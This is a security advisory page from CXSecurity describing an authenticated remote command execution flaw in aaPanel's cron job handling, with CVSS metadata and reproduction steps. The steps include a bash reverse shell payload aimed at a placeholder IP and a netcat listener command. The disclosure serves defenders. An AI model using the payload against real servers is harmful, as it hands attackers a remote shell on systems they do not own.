---
title: aaPanel 7.x.x Remote Command Execution
url: https://cxsecurity.com/issue/WLB-2025090010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-09-22
fetch_date: 2025-10-02T20:29:48.490372
---

# aaPanel 7.x.x Remote Command Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **aaPanel 7.x.x Remote Command Execution** **2025.09.21**  Credit:  **[Alasdair Gorniak](https://cxsecurity.com/author/Alasdair%2BGorniak/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2020-14421](https://cxsecurity.com/cveshow/CVE-2020-14421/ "Click to see CVE-2020-14421")**  CWE: **[CWE-88](https://cxsecurity.com/cwe/CWE-88 "CWE-88")**  CVSS Base Score: **9/10**  Impact Subscore: **10/10**  Exploitability Subscore: **8/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **Single time**  Confidentiality impact: **Complete**  Integrity impact: **Complete**  Availability impact: **Complete** | |

This is authenticated RCE.
Vulnerability Description
During my testing/evaluation of aaPanel, I identified a flaw in how cron
jobs are handled, which enables an attacker to inject and execute arbitrary
commands remotely. Specifically:
-
An authenticated user can manipulate cron job entries in a way that
breaks out of the software to the server.
-
This leads to the execution of malicious code on the server hosting
aaPanel, potentially compromising the entire system.
Steps to Reproduce
1.
Log in to the aaPanel dashboard
2.
Create a new cron job with the payload: bash -c "bash -i >& /dev/tcp/XXXX/1234 0>&1" (XXXX is your ip)
3.
Save the cron job and trigger it (or wait for the scheduled execution).
Start a listener on the other side to receive: nc -lvnp 1234
4.
Observe the execution of the injected command on the server and RCE.
Many thanks,
Alasdair Gorniak/Hamed Kohi

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025090010)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top